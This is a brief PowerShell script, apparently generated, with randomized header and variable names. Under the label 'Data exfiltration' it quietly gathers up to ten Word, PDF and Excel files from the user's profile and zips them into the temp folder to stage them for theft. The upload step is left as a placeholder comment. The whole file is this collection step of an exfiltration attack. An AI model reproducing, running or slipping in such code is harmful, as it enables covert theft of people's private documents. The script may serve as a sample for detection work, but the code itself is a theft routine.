# HmnjtexkwVbK7tAZ16RW
# Generated: 2025-11-03T12:20:52.710343
# System: eOpCby5Ci3WB4TV
# Process: qhzXO8dP2F3v


# Data exfiltration
$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10

if ($sensitiveFiles) {
    $e65p8zxVZip = "$env:TEMP\data.zip"
    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $e65p8zxVZip -Force
    # Upload logic would go here
}
